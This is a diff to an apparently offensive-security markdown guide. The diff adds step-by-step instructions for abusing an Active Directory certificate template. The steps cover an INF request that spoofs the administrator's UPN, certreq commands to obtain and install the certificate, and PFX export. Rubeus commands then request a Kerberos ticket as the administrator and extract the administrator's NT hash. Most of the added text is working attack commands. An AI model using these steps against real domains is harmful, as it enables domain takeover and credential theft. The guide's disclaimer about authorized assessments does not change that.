@@ -17,17 +17,15 @@ This guide is intended for authorized security assessments only. Unauthorized us
 
 Enjoy learning and, most importantly, stay safe!
 
- # Follow the instructions:
+## **Step-by-Step Instructions**
 
- Creat a 'inf' file:
- ```
-powershell
-
+### 1. **Create an INF file**
+```ini
 [Version]
 Signature="$Windows NT$"
 
 [NewRequest]
-Subject = "CN=administrator, OU=Users, DC=bev, DC=beer"
+Subject = "CN=administrator, OU=Users, DC=shkud, DC=local" 
 KeySpec = 1
 KeyLength = 2048
 Exportable = TRUE
@@ -42,5 +40,55 @@ OID=1.3.6.1.5.5.7.3.2  ; Client Authentication
 
 [Extensions]
 2.5.29.17 = "{text}"
-_continue_ = "dns=bev.beer&upn=administrator@bev.beer"
+_continue_ = "dns=shkud.local&upn=administrator@shkud.local"
+```
+
+Change the Subject record to the Distinguished Name (DN) of the user account you want to impersonate:
+```
+Subject = "CN=administrator, OU=Users, DC=shkud, DC=local"
+```
+
+Additionally, update the continue record as well:
+```
+_continue_ = "dns=shkud.local&upn=administrator@shkud.local"
+```
+
+### 2. **After creating the INF file, generate a CSR file using the following command:**
+```
+certreq -new My_request.inf My_request.csr
+```
+
+### 3. **Next, submit the CSR to the CA server, specifying the desired certificate template, and save the issued certificate:**
+```
+certreq -submit -attrib "CertificateTemplate:My_Template" My_request.csr My_Cert.cer
+```
+
+### 4. **Finally, accept and install the issued certificate using the following command:**
+```
+certreq -accept My_Cert.cer
+```
+
+### 5. **Next, locate the Thumbprint of the certificate by running the following command:**
+```
+Get-ChildItem Cert:\CurrentUser\My
+```
+
+### 6. **Afterward, generate a PFX file by executing the following commands:**
+```
+$password = ConvertTo-SecureString -String '1qaz!QAZ' -AsPlainText -Force
+Export-PfxCertificate -Cert Cert:\CurrentUser\My\5440925da4167c5f92cd9cf66a4f68622f63e1c7 -FilePath administrator.pfx -Password $password
+```
+
+### 7. **Now, with the PFX file, you can use Rubeus to request a TGT (Ticket Granting Ticket) using the certificate. Execute the following command:**
+```
+.\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:1qaz!QAZ /dc:dc.shkud.local /domain:shkud.local /ptt
+```
+
+Of course, since we're working with the PKINIT protocol, we can exploit the use of the User-to-User (U2U) mechanism. This allows us to request a TGS (Ticket Granting Service) for a service that belongs to ourselves (yes, it sounds strange, but it works).
+
+The TGS ticket we receive will include a PAC (Privilege Attribute Certificate), and within that PAC, we can extract the NT Hash of the user account we impersonated.
+
+Just add the /getcredentials flag with the rubeus tool:
+```
+.\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:1qaz!QAZ /dc:dc.shkud.local /domain:shkud.local /getcredentials
 ```
